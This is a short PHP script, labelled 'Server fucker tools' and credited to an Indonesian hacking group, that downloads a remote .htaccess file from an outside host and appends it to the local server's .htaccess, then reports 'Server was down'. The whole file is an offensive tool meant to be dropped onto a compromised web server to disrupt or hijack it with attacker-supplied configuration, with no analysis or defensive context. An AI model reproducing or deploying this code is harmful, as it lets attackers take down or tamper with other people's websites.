<?
/*
# Server fucker tools
# Developer  : Budz Story-zz
# Contact    : http://forum.ifc.or.id/
# Greetz to Indonesian Fighter Cyber & Cyber SecurityTeam
*/

$htaccess = "http://tools-online.googlecode.com/files/.htaccess";
$file = file_get_contents($htaccess);
$open = fopen(".htaccess" , 'a');
fwrite($open,$file);
fclose($open);
 if($open) 
 {
 echo "<br><center>[+] Server was down !![+]</center>";
 } 
else 
 {
 echo "<br><center>[-] Mision failure !![-]</center>";
 }

?>